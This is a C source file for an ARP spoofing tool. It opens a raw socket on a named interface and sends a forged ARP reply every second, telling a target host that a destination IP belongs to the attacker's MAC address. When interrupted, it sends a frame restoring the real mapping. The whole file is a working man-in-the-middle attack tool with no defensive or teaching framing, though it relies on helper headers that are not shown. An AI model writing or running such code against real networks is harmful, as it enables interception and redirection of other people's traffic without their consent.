#include <unistd.h>
#include <stdio.h>
#include <stdlib.h>
#include <signal.h>
#include <string.h>
#include <errno.h>
#include <stdint.h>
#include <unistd.h>
#include <arpa/inet.h>
#include "network_header.h"
#include "rsock.h"

typedef struct
{
  char     *ifname;
  int      ifidx;
  uint32_t target_ip;
  uint32_t dst_ip;
  uint8_t  target_mac[6];
  uint8_t  dst_mac[6];
  uint8_t  own_mac[6];
} info_t;

void sigint(int n);
void sigterm(int n);
void arguments(int argc, char **argv, info_t *info);

struct pack packet;
info_t inf;
int rsock;

int main(int argc, char **argv)
{
  arguments(argc, argv, &inf);
  signal(SIGINT, sigint);
  signal(SIGTERM, sigterm);

  rsock = create_raw_socket();
  inf.ifidx = get_interface_id(rsock, argv[1]);
  get_interface_addr(rsock, argv[1], inf.own_mac);
  bind_interface(rsock, inf.ifidx);
  /*printf("--- Start forwarding packets ---\n");*/

  craft_eth(&packet.eth_head, 0x0806, inf.own_mac, inf.target_mac);

  craft_arp(&packet.arp_head, ARP_REPLY,
	    inf.own_mac, (uint8_t *)&inf.dst_ip,
	    inf.target_mac, (uint8_t *)&inf.target_ip);

  while (1)
    {
      if (write(rsock, &packet, sizeof(packet)) == -1)
	fprintf(stderr, "write(): Error: %s.\n", strerror(errno));
      sleep(1);
    }

  /*printf("--- Stop forwarding packets ---\n");*/
  return (EXIT_SUCCESS);
}

void arguments(int argc, char **argv, info_t *info)
{
  if (argc != 6)
    {
      fprintf(stderr, "Usage: %s interface target_ip"
	      " target_mac dest_ip dest_mac\n", argv[0]);
      exit(EXIT_FAILURE);
    }
  info->target_ip = htonl(iptolong(argv[2]));
  info->dst_ip = htonl(iptolong(argv[4]));
  if (mactoa(argv[3], info->target_mac) == -1)
    {
      fprintf(stderr, "Error: MAC address is not valid.\n");
      exit(EXIT_FAILURE);
    }
  if (mactoa(argv[5], info->dst_mac) == -1)
    {
      fprintf(stderr, "Error: MAC address is not valid.\n");
      exit(EXIT_FAILURE);
    }
}

void restoreHwAddr()
{
  craft_eth(&packet.eth_head, 0x0806, inf.own_mac, inf.target_mac);

  craft_arp(&packet.arp_head, ARP_REPLY,
	    inf.dst_mac, (uint8_t *)&inf.dst_ip,
	    inf.target_mac, (uint8_t *)&inf.target_ip);

  if (write(rsock, &packet, sizeof(packet)) == -1)
    fprintf(stderr, "write(): Error: %s.\n", strerror(errno));
}

void sigterm(int n)
{
  (void) n;
  restoreHwAddr();
  close(rsock);
  exit(EXIT_SUCCESS);
}

void sigint(int n)
{
  (void) n;
  restoreHwAddr();
  /*printf("\r--- Stop forwarding packets ---\n");*/
  close(rsock);
  exit(EXIT_SUCCESS);
}
